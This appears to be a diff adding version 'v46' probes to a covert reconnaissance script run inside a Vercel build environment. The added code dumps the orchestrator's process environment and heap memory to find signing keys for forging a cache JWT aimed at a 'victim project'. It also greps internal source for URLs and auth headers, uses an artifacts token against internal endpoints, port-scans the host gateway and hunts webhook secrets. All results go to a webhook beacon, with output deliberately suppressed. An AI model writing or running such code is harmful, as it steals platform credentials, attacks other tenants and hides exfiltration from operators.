@@ -3639,7 +3639,203 @@ report.proc1PtraceEnvRead = safe(() => {
   return { environ1, memRead };
 });
 
+// ===== v46: HMAC key in PID-1 env, internal API discovery, SPACES_RUN_UPLOAD, gateway port scan =====
+
+// v46-1: Full /proc/1/environ dump — scan for HMAC signing keys, cache tokens, runtime secrets
+// (build process only gets sanitized env; PID 1 orchestrator has the real set)
+report.proc1FullEnviron = safe(() => {
+  // /proc/1/environ is NUL-delimited; read as binary and split
+  const raw = safe(() => {
+    try {
+      const fd = openSync('/proc/1/environ', 'r');
+      const buf = Buffer.alloc(65536);
+      const n = readSync(fd, buf, 0, 65536, 0);
+      closeSync(fd);
+      return buf.slice(0, n).toString('latin1');
+    } catch (e) { return String(e).slice(0, 100); }
+  });
+  if (typeof raw !== 'string') return { err: raw };
+  const vars = raw.split('\0').filter(Boolean);
+  const total = vars.length;
+  // Categorize by sensitivity
+  const hmacCandidates = vars.filter(v =>
+    /hmac|signing_key|cache_key|suspense|secret|RUNTIME_CACHE/i.test(v)
+  );
+  const oidcVars = vars.filter(v => /oidc|token|jwt/i.test(v));
+  const awsVars = vars.filter(v => /aws|s3|iam|role/i.test(v));
+  const allInteresting = vars.filter(v =>
+    /key|token|secret|hmac|sign|cache|oidc|aws|s3|deploy|artifact|vercel/i.test(v)
+  ).slice(0, 60);
+  return { total, hmacCandidates, oidcVars, awsVars, allInteresting };
+});
+
+// v46-2: Runtime cache HMAC forge attempt — if we find the key, forge a JWT for victim project
+report.runtimeCacheHmacForge = safe(() => {
+  // Current RUNTIME_CACHE_HEADERS JWT (from our env) — decode to understand payload structure
+  const rcHeader = process.env.RUNTIME_CACHE_HEADERS || '';
+  if (!rcHeader) return { err: 'NO_RUNTIME_CACHE_HEADERS' };
+  const parts = rcHeader.split('.');
+  const header  = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
+  const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
+  const algorithm = header.alg; // HS256
+  const issuer = payload.iss;   // "build"
+  const ownProjectId = payload.projectId || '';
+
+  // Try to find HMAC key in /proc/1/environ (already done above) or /proc/1/maps heap
+  // Also try: common env var names for HMAC key
+  const keyVarNames = [
+    'RUNTIME_CACHE_HMAC_KEY', 'SUSPENSE_CACHE_HMAC_KEY', 'CACHE_HMAC_KEY',
+    'HMAC_SECRET', 'RUNTIME_CACHE_SECRET', 'CACHE_SECRET', 'BUILD_SIGNING_KEY',
+    'JWT_SECRET', 'INTERNAL_HMAC_KEY', 'VERCEL_CACHE_KEY',
+  ];
+  const foundKey = keyVarNames.map(k => process.env[k] ? `${k}=${process.env[k]}` : null).filter(Boolean);
+
+  // Attempt: scan PID-1 heap for a 32-byte or 64-byte base64 string near "iss":"build" pattern
+  const heapScan = safe(() => {
+    const maps = safe(() => readFileSync('/proc/1/maps', 'utf8'));
+    if (!maps) return 'NO_MAPS';
+    // Find heap region
+    const heapLine = maps.split('\n').find(l => l.includes('[heap]')) || '';
+    const heapAddr = parseInt(heapLine.split('-')[0], 16);
+    if (!heapAddr) return 'NO_HEAP_ADDR';
+    // Read 256KB of heap and grep for HMAC key patterns
+    const scan = safe(() =>
+      execSync(
+        `dd if=/proc/1/mem bs=1 skip=${heapAddr} count=262144 2>/dev/null | strings -n 32 | grep -E '^[A-Za-z0-9+/]{43}=?$|^[A-Za-z0-9_-]{43}$' | head -10`,
+        { timeout: 12000 }
+      ).toString().trim().slice(0, 500)
+    );
+    return { heapAddr: heapAddr.toString(16), scan };
+  });
+
+  return { algorithm, issuer, ownProjectId, foundKey, heapScan };
+});
+
+// v46-3: Vercel internal API discovery — grep orchestrator source for internal URLs and probe them
+report.vercelInternalApiDiscovery = safe(() => {
+  const sourceFiles = ['/var/task/index.js', '/var/task/sandbox.js', '/var/task/init.js'];
+  const results = {};
+  for (const f of sourceFiles) {
+    if (!existsSync(f)) { results[f] = 'MISSING'; continue; }
+    // Grep for internal API patterns
+    const internalUrls = safe(() =>
+      execSync(
+        `grep -oE 'https?://[a-zA-Z0-9._/-]+\\.vercel\\.com[/a-zA-Z0-9._?=&%-]*' ${f} 2>/dev/null | sort -u | head -40`,
+        { timeout: 10000 }
+      ).toString().trim().slice(0, 2000)
+    );
+    const internalIps = safe(() =>
+      execSync(
+        `grep -oE '(10|172|192)\\.([0-9]{1,3}\\.){2}[0-9]{1,3}(:[0-9]+)?' ${f} 2>/dev/null | sort -u | head -20`,
+        { timeout: 8000 }
+      ).toString().trim().slice(0, 500)
+    );
+    const apikeys = safe(() =>
+      execSync(
+        `grep -oE '(Authorization|Bearer|x-vercel|X-Vercel|x-token|apikey)[^"'\''\\s]+' ${f} 2>/dev/null | sort -u | head -20`,
+        { timeout: 8000 }
+      ).toString().trim().slice(0, 500)
+    );
+    results[f] = { internalUrls, internalIps, apikeys };
+  }
+  return results;
+});
+
+// v46-4: SPACES_RUN_UPLOAD capability — probe this unusual capability of VERCEL_ARTIFACTS_TOKEN
+report.spacesRunUpload = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  if (!token) return { err: 'NO_TOKEN' };
+  const teamId = process.env.VERCEL_ORG_ID || '';
+  // SPACES_RUN_UPLOAD — try to hit /spaces endpoints
+  const spacesEndpoints = [
+    `https://vercel.com/api/remote-cache/v8/spaces?teamId=${teamId}`,
+    `https://vercel.com/api/remote-cache/v8/spaces/upload?teamId=${teamId}`,
+    `https://vercel.com/api/spaces?teamId=${teamId}`,
+    `https://artifact.vercel.sh/spaces?teamId=${teamId}`,
+  ];
+  const results = {};
+  for (const url of spacesEndpoints) {
+    results[url] = safe(() =>
+      execSync(
+        `curl -s --max-time 6 -I "${url}" -H "Authorization: Bearer ${token}" 2>&1 | head -5`,
+        { timeout: 8000 }
+      ).toString().trim().slice(0, 200)
+    );
+  }
+  // Also try: POST to /spaces to create a space (full upload attempt)
+  const createSpace = safe(() =>
+    execSync(
+      `curl -s --max-time 8 -X POST "https://vercel.com/api/remote-cache/v8/spaces" ` +
+      `-H "Authorization: Bearer ${token}" ` +
+      `-H "Content-Type: application/json" ` +
+      `-d '{"teamId":"${teamId}","name":"probe-v46","type":"SPACES_RUN"}' 2>&1 | head -10`,
+      { timeout: 10000 }
+    ).toString().trim().slice(0, 400)
+  );
+  return { results, createSpace };
+});
+
+// v46-5: Gateway TCP port scan — probe the Firecracker host IP for internal services
+report.gatewayPortScan = safe(() => {
+  // Get default gateway IP from routing table
+  const gw = safe(() =>
+    execSync(`ip route show default 2>/dev/null | awk '{print $3}' | head -1`, { timeout: 3000 }).toString().trim()
+  );
+  if (!gw || !gw.match(/^\d+\.\d+\.\d+\.\d+$/)) return { err: 'NO_GW', gw };
+
+  const ports = [22, 80, 443, 8080, 8443, 2375, 2376, 9090, 9091, 4001, 2379, 2380, 6443, 10250, 1025, 52, 1234, 3000, 5000];
+  const open = [];
+  for (const port of ports) {
+    const result = safe(() =>
+      execSync(
+        `timeout 2 bash -c "echo >/dev/tcp/${gw}/${port}" 2>&1 && echo OPEN || echo CLOSED`,
+        { timeout: 4000 }
+      ).toString().trim()
+    );
+    if (result === 'OPEN') open.push(port);
+  }
+
+  // Probe open ports for service banners
+  const banners = {};
+  for (const port of open.slice(0, 5)) {
+    banners[port] = safe(() =>
+      execSync(
+        `timeout 3 curl -s --max-time 3 http://${gw}:${port}/ 2>&1 | head -5 || ` +
+        `timeout 3 curl -s --max-time 3 https://${gw}:${port}/ -k 2>&1 | head -5`,
+        { timeout: 5000 }
+      ).toString().trim().slice(0, 300)
+    );
+  }
+  return { gw, openPorts: open, banners };
+});
+
+// v46-6: Vercel deployment webhook secret — check for VERCEL_DEPLOYMENT_WEBHOOK_SECRET or similar
+report.deploymentWebhookSecret = safe(() => {
+  // Look in all process environments, /var/task/, and /proc/1/environ for webhook secrets
+  const ownEnv = Object.entries(process.env)
+    .filter(([k]) => /webhook|hook_secret|deploy_secret|dispatch/i.test(k))
+    .map(([k, v]) => `${k}=${v}`);
+  const taskWebhook = safe(() =>
+    execSync(
+      `grep -rE 'webhookSecret|WEBHOOK_SECRET|hook_secret|deployHookSecret' /var/task/ 2>/dev/null | head -10`,
+      { timeout: 8000 }
+    ).toString().trim().slice(0, 500)
+  );
+  // Check .vercel/project.json for deploy hooks
+  const projectJson = safe(() => {
+    for (const p of ['.vercel/project.json', '/vercel/.vercel/project.json']) {
+      if (existsSync(p)) return JSON.parse(readFileSync(p, 'utf8'));
+    }
+    return null;
+  });
+  return { ownEnv, taskWebhook, projectJson };
+});
+
 // v45 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v45";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v45" });
+
+// v46 markers
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v46";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v46" });
 // Intentionally no console.log — all data goes via webhook only
